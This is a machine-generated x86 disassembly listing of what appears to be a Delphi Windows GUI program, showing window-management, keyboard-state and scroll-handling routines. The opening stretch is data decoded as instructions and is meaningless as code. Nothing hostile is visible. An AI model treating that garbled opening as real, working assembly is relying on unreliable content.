push esp
adc [ eax ] al
and dh dl
inc ebp
add [ esi + edx * 8 ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] ah
salc
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
jo r-xdata
imul ebp [ edi + 0x6e ] 0x40111c00
inc ebp
jbe r-xdata
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x5800408d
fwait
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffba65 ] cl
fwait
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x5fffba65 ] bl
add [ eax ] al
add [ esp + ebp ] al
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
sub [ ebx ] cl
inc esi
add [ eax + 0x2800414a ] bl
mov eax [ 0x49b40041 ]
inc ecx
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al dl
or [ esi ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] bh
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
test al 0x9b
inc ebp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
pop eax
fwait
inc ebp
add [ eax ] al
sub eax 0x20041
add eax 0x6d726f46
jae r-xdata
outsb
arpl [ eax - 0x70 ] bp
add [ ebx + 0x45 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fwait
inc ebp
add al bh
pushfd
inc ebp
add [ eax ] cl
adc edx [ ebx + edx * 2 + 0x65 ]
je r-xdata
jbe r-xdata
push cs
push esp
push ebx
push 0x6948776f
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x6e657645
adc [ eax ] ecx
dec eax
imul ebp [ esi + 0x74 ] 0x6f666e49
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
outsb
je r-xdata
jb r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
imul ebp [ esi + 0x67 ] 0x6e616843
inc ebp
jbe r-xdata
outsb
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al [ edi ]
outsb
outsw
add [ eax + edx + 0x10000040 ] bh
inc eax
add ah al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
mov al [ 0x800459c ]
add [ ebp - 0x639bffc0 ] cl
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
je r-xdata
cli
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
sub [ esi + 0xc070045 ] bl
push esp
inc ecx
jo r-xdata
sahf
inc ebp
add [ eax + 0x1 ] al
add [ eax ] al
add al 0x2c
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
sub [ esi + 0x45 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
outsb
je r-xdata
add [ esi + eax * 2 ] al
insb
popad
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc esi
add eax [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
or [ ecx ] al
inc ebp
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x1 ] si
inc ecx
cwde
dec edx
imul ebp [ esi + 0x67 ] 0x65520601
jae r-xdata
add [ esp + eax * 2 ] eax
outsd
outsb
pop es
inc edx
outsd
outsd
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x4 ] si
inc esp
inc ebp
add [ eax ] cl
or dl [ ecx + ecx * 2 + 0x64 ]
insb
inc ebp
jbe r-xdata
dec ebp
push ebx
inc edi
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
nop
and al 0x9c
inc ebp
add [ eax ] cl
andps xmm0 [ ebp + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
lodsb [ esi ]
popfd
inc ebp
add [ eax ] al
sub eax 0x20041
add eax 0x6d726f46
jae r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
xor [ 0x4a980046 ] bl
jb r-xdata
outsb
push es
push ebx
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
imul ebp [ esi + 0x67 ] 0x61430701
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
push ebx
je r-xdata
push es
add [ edx + esi * 2 + 0x40 ] bh
outsd
outsb
add [ ecx + edx ] bl
inc eax
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ ebx + ebx + 0x46 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] bh
add [ eax ] al
mov esp 0x3c004010
add [ eax ] al
add [ edi + edx * 2 + r--data ] cl
add [ eax ] al
mov esp 0x50004010
add [ eax ] al
add [ eax + edx + 0x540040 ] bh
add [ eax ] al
mov esp 0x8c004010
add [ eax ] al
add [ esp + edx * 2 ] cl
inc ecx
jo r-xdata
add [ edx - 0x5f33ffbf ] ah
insb
je r-xdata
inc eax
outsd
outsb
inc ebp
jbe r-xdata
add [ ecx + rw-data ] ah
retn
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
pop es
add [ ecx + edx ] bl
dec ecx
outsb
je r-xdata
add [ ebp - 0x635fffc0 ] cl
inc ebp
add [ eax ] cl
je r-xdata
outsb
add [ eax ] ch
mov eax [ 0x49b40041 ]
inc ecx
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x10540040 ] bh
inc eax
add [ ebx + 0x459dacc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
popfd
inc ebp
add [ eax ] ch
sahf
inc ebp
sbb al 0x11
sub_459e58
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_459ea4
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46372c
mov eax [ rw-data ]
call sub_41a050
mov eax [ rw-data ]
call sub_419ff8
retn
push 0x0
push eax
call ShowOwnedPopups
sub_459edc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_459f2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_459fcf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4037e4#5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_459edc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459fd6
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_459fe0
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402714
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_45a018
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_45a07c
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_45a018
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_45a0d8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_45a0f8
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_45a0d8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_45a124
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_460c7c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_461134
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407f78
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_460c68
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_461120
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407f78
test eax eax
je r-xdata
sub_45a1a4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45a1f8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45a234
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_45a280
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a2de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45733c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40427c
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f78
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a2e5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
sub_45a2f0
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_45a318
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_45a389
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45a2f0
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a390
lea eax [ ebp - 0xc ]
call sub_404094
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
sub_45a398
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45a428
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4149b4
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_45acf0
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_45acd0
mov edx [ edi + 0xc ]
mov eax ebx
call sub_45ab80
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a478
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45a630
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_442bdc
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_45ab80
xor edx edx
mov eax ebx
call sub_45ab80
jmp r-xdata
sub_45a4b0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4248f4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45a51c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4248f4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45a584
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_45acb8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_445ab4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_45acb8
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_445a78
call sub_45a51c
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_445a78
call sub_45a4b0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_45a630
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_448d84
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45a668
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_45a69c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_45a668
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_45a668
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_45a718
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_45a69c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_441f54
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_45a69c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_441f98
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45a7b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448d84
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_45a810
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_45a9e1 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45a718
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45a718
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
push ebp
call sub_45a7b0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
push ebp
call sub_45a7b0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406c10
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45ab80
